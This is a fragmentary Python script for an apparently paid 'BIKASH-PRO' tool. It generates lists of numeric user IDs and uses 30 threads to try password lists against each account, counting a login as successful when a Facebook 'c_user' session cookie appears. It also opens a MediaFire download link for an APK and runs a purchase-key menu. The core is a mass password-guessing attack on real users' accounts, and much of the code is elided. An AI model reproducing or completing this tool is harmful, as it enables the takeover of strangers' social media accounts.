...
os.system('xdg-open https://www.facebook.com/profile.php?id=100057497148585)
...
----------------------------------------------
 ...
 Tool Name : BIKASH-PRO
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 BIKASH Pro version 1.9.8
 Welcome to my tool
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/BIKASH_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi Bikash Sir, I Need To Buy Your Paid BIKASH PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Bikash:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                Bikash.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Bikash=session.cookies.get_dict().keys()
                        if "c_user" in Bikash:
